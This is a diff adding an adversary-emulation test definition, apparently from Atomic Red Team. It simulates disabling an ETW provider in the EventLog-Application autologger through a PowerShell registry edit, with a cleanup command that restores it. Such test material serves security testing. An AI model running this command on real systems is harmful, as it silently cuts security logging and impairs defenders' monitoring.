@@ -1,0 +1,38 @@
+- id: 8f907648-1ebf-4276-b0f0-e2678ca474f0
+  name: Disable EventLog-Application ETW Provider Via Registry - PowerShell
+  description: This atomic simulates an activity where an attacker disables a specific
+    ETW provider from the EventLog-Application ETW Auto Logger session using the powershell.exe
+    "New-ItemProperty" cmdlet to update the Windows registry value "Enabled". This
+    would effectivly remove that provider from the session and cause to not emit any
+    logs of that type. The changes would only take effect after a restart.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1562.001
+    name: 'Impair Defenses: Disable or Modify Tools'
+  platforms:
+    windows:
+      psh:
+        command: New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application\{B6D775EF-1436-4FE6-BAD3-9E436319E218}"
+          -Name Enabled -Value 0 -PropertyType "DWord" -Force
+        cleanup: New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application\#{ETWProviderGUID}"
+          -Name Enabled -Value 1 -PropertyType "DWord" -Force
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1562.001
+  - atomic-red-team
+  - defense-evasion
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      ETWProviderGUID:
+        type: string
+        default: '{B6D775EF-1436-4FE6-BAD3-9E436319E218}'
+        description: Microsoft-Windows-SenseIR ETW Provider GUID
+    technique_created: '2020-02-21T20:32:20.810Z'
+    atomic_guid: 8f907648-1ebf-4276-b0f0-e2678ca474f0
+    import_timestamp: '2025-06-24T11:15:01.139369Z'
